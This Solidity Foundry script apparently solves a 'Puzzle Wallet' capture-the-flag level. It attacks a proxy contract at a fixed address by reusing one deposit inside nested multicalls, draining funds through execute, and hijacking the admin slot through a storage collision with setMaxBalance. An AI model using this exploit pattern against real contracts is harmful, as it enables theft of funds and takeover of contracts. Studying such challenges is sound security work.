// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/PuzzleWallet.sol";

contract PuzzleWalletScript is Script {
    event Log(bytes4);
    address _deployedContractAddress = 0x5984A23D17ECDDe08d6D96284c79b4291b71944F;
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        PuzzleProxy target = PuzzleProxy(payable(_deployedContractAddress));

        bytes memory depositFunc = abi.encodeWithSelector(bytes4(keccak256("deposit()")));
        bytes memory executeFunc = abi.encodeWithSelector(bytes4(keccak256("execute(address,uint256,bytes)")), address(0), 0.002 ether, "");
        bytes memory setMaxBalance = abi.encodeWithSelector(bytes4(keccak256("setMaxBalance(uint256)")), 0x97A008FE1887b1448313b69F4324194a8e2a739D);

        bytes[] memory multiDeposit = new bytes[](1);
        multiDeposit[0] = depositFunc;

        bytes memory innterMulticall = abi.encodeWithSelector(bytes4(keccak256("multicall(bytes[])")), multiDeposit);

        bytes[] memory arg = new bytes[](3);

        arg[0] = depositFunc;
        arg[1] = innterMulticall;
        arg[2] = executeFunc;
        // arg[3] = setMaxBalance;

        bytes memory multicallFunc = abi.encodeWithSelector(bytes4(keccak256("multicall(bytes[])")), arg);

        address(target).call{value : 0.001 ether}(multicallFunc);
        address(target).call(setMaxBalance);

        vm.stopBroadcast();
    }
}